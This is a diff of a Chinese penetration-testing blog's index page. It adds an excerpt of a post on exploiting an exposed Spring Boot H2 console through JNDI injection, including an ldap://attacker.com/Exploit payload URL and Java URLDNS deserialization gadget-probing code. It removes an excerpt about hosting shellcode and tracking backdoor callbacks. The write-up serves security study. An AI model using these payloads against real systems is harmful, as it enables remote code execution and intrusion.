@@ -117,6 +117,132 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2022/03/18/from-spring-boot-to-getshell.html" >从Spring Boot H2 Database到GetShell</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2022-03-18  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x1-切入点"><a href="#0x1-切入点" class="headerlink" title="0x1. 切入点"></a>0x1. 切入点</h2><p>在日常测试的时候，使用ffuf发现一个<code>/console</code>的接口，打开之后发现是H2 Database页面：<br><img src="/2022/03/18/from-spring-boot-to-getshell/1.png"><br>如果Spring Boot项目中包含h2database并且在配置文件中启用h2-console，则存在<a target="_blank" rel="noopener" href="https://anquan.baidu.com/article/1078">JNDI注入漏洞</a>.</p>
+<p>设置<code>Driver Class</code>为<code>javax.naming.InitialContext</code>，<code>JDBC URL</code>为<code>ldap://attacker.com/Exploit</code>：<br><img src="/2022/03/18/from-spring-boot-to-getshell/2.png"><br>根据<code>/env</code>泄漏的信息，得知Java版本是1.8.0_312，高版本JDK中由于默认codebase为true从而导致客户端默认不会请求远程Server上的恶意 Class, 因此不可以直接使用LDAP加载远程恶意代码。</p>
+<blockquote>
+<p>RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 true<br>LDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true</p>
+</blockquote>
+<h2 id="0x2-绕过和利用"><a href="#0x2-绕过和利用" class="headerlink" title="0x2. 绕过和利用"></a>0x2. 绕过和利用</h2><h3 id="利用本地Class作为Reference-Factory绕过"><a href="#利用本地Class作为Reference-Factory绕过" class="headerlink" title="利用本地Class作为Reference Factory绕过"></a>利用本地Class作为Reference Factory绕过</h3><p>利用URLDNS链可以探测Java黑盒应用里面某个类是否存在, 在珂字辈和c0ny1师傅的两篇文章讲的很详细：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldns链探测类工具发放</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">构造java探测class反序列化gadget</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">老链新用，利用URLDNS链探测gadget</a></li>
+</ul>
+<p>URLDNS的测试代码，生成一个序列化的数据包<code>1.ser</code>：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Urldns</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://333.f9575af1.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token comment">//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);</span>
+          hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.beanutils.BeanComparator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));</span>
+        <span class="token comment">//ois.readObject();</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> clazzName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>clazzName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2022/03/18/from-spring-boot-to-getshell.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x1-切入点"><a href="#0x1-切入点" class="headerlink" title="0x1. 切入点"></a>0x1. 切入点</h2><p>在日常测试的时候，使用ffuf发现一个<code>/console</code>的接口，打开之后发现是H2 Database页面：<br><img src="/2022/03/18/from-spring-boot-to-getshell/1.png"><br>如果Spring Boot项目中包含h2database并且在配置文件中启用h2-console，则存在<a target="_blank" rel="noopener" href="https://anquan.baidu.com/article/1078">JNDI注入漏洞</a>.</p>
+<p>设置<code>Driver Class</code>为<code>javax.naming.InitialContext</code>，<code>JDBC URL</code>为<code>ldap://attacker.com/Exploit</code>：<br><img src="/2022/03/18/from-spring-boot-to-getshell/2.png"><br>根据<code>/env</code>泄漏的信息，得知Java版本是1.8.0_312，高版本JDK中由于默认codebase为true从而导致客户端默认不会请求远程Server上的恶意 Class, 因此不可以直接使用LDAP加载远程恶意代码。</p>
+<blockquote>
+<p>RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 true<br>LDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true</p>
+</blockquote>
+<h2 id="0x2-绕过和利用"><a href="#0x2-绕过和利用" class="headerlink" title="0x2. 绕过和利用"></a>0x2. 绕过和利用</h2><h3 id="利用本地Class作为Reference-Factory绕过"><a href="#利用本地Class作为Reference-Factory绕过" class="headerlink" title="利用本地Class作为Reference Factory绕过"></a>利用本地Class作为Reference Factory绕过</h3><p>利用URLDNS链可以探测Java黑盒应用里面某个类是否存在, 在珂字辈和c0ny1师傅的两篇文章讲的很详细：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldns链探测类工具发放</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">构造java探测class反序列化gadget</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">老链新用，利用URLDNS链探测gadget</a></li>
+</ul>
+<p>URLDNS的测试代码，生成一个序列化的数据包<code>1.ser</code>：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Urldns</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://333.f9575af1.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token comment">//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);</span>
+          hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.beanutils.BeanComparator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));</span>
+        <span class="token comment">//ois.readObject();</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> clazzName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>clazzName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2022/03/18/from-spring-boot-to-getshell.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/08/06/windows-ntlm-smb-scan.html" >NTLM端口信息探测</a>
 		</h3>
 		</div>
@@ -553,92 +679,6 @@ C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2021/04/06/defense-from-c2.html" >防御性C2玩具尝试</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-04-06  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="背景需求"><a href="#背景需求" class="headerlink" title="背景需求"></a>背景需求</h3><p>不管一个什么形式的后门：定时任务、dll劫持、开机启动…，当我设置的后门运行的时候，我想掌握后门的启动时间、触发IP等上环境，所以这篇文章是在shellcode分离免杀的基础上做了尝试性扩展</p>
-<h4 id="考虑这样的场景："><a href="#考虑这样的场景：" class="headerlink" title="考虑这样的场景："></a>考虑这样的场景：</h4><ul>
-<li>后门被静态分析</li>
-<li>后门被动态分析</li>
-<li>shellcode被提取之后触发</li>
-<li>…</li>
-</ul>
-<p>在shellcode分离免杀的基础上扩展还是比较容易的，当客户端请求远程shellcode托管服务器的时候，增加一个机器人，然后发起一个上线通知：If This Then That，这样太简单了，我们再多加点料，比如：</p>
-<ol>
-<li>不带合理参数请求shellcode的URL时候，发起警告</li>
-<li>当木马运行在恶意环境的时候，发起警告<ul>
-<li>当木马上线IP不在服务端列表</li>
-<li>当木马上线主机的设备指纹不在服务端列表</li>
-</ul>
-</li>
-<li>shellcode托管服务随时可以关闭打开</li>
-<li>shellcode托管服务随时可以新增删除木马上线IP或者设备指纹</li>
-</ol>
-<h3 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h3><ul>
-<li>一台VPS：托管shellcode，通知slack机器人</li>
-<li>一个AWS账号隐藏C2（CloudFront）</li>
-<li>Slack：接收通知，使用<code>Slash commands</code>功能控制shellcode托管服务</li>
-</ul>
-<h5 id="托管shellcode流程"><a href="#托管shellcode流程" class="headerlink" title="托管shellcode流程"></a>托管shellcode流程</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p>
-	
-
-	</div>
-  <a type="button" href="/2021/04/06/defense-from-c2.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="背景需求"><a href="#背景需求" class="headerlink" title="背景需求"></a>背景需求</h3><p>不管一个什么形式的后门：定时任务、dll劫持、开机启动…，当我设置的后门运行的时候，我想掌握后门的启动时间、触发IP等上环境，所以这篇文章是在shellcode分离免杀的基础上做了尝试性扩展</p>
-<h4 id="考虑这样的场景："><a href="#考虑这样的场景：" class="headerlink" title="考虑这样的场景："></a>考虑这样的场景：</h4><ul>
-<li>后门被静态分析</li>
-<li>后门被动态分析</li>
-<li>shellcode被提取之后触发</li>
-<li>…</li>
-</ul>
-<p>在shellcode分离免杀的基础上扩展还是比较容易的，当客户端请求远程shellcode托管服务器的时候，增加一个机器人，然后发起一个上线通知：If This Then That，这样太简单了，我们再多加点料，比如：</p>
-<ol>
-<li>不带合理参数请求shellcode的URL时候，发起警告</li>
-<li>当木马运行在恶意环境的时候，发起警告<ul>
-<li>当木马上线IP不在服务端列表</li>
-<li>当木马上线主机的设备指纹不在服务端列表</li>
-</ul>
-</li>
-<li>shellcode托管服务随时可以关闭打开</li>
-<li>shellcode托管服务随时可以新增删除木马上线IP或者设备指纹</li>
-</ol>
-<h3 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h3><ul>
-<li>一台VPS：托管shellcode，通知slack机器人</li>
-<li>一个AWS账号隐藏C2（CloudFront）</li>
-<li>Slack：接收通知，使用<code>Slash commands</code>功能控制shellcode托管服务</li>
-</ul>
-<h5 id="托管shellcode流程"><a href="#托管shellcode流程" class="headerlink" title="托管shellcode流程"></a>托管shellcode流程</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p>
-	
-	</div>
-  <a type="button" href="/2021/04/06/defense-from-c2.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -694,7 +734,7 @@ C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>43</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -715,6 +755,10 @@ C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
+      </li>
+    
+      <li>
         <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
       </li>
     
@@ -728,10 +772,6 @@ C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></
     
       <li>
         <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
-      </li>
-    
-      <li>
-        <a href="/2021/04/06/defense-from-c2.html" ><i class="fa fa-file-o"></i>防御性C2玩具尝试</a>
       </li>
     
   </ul>
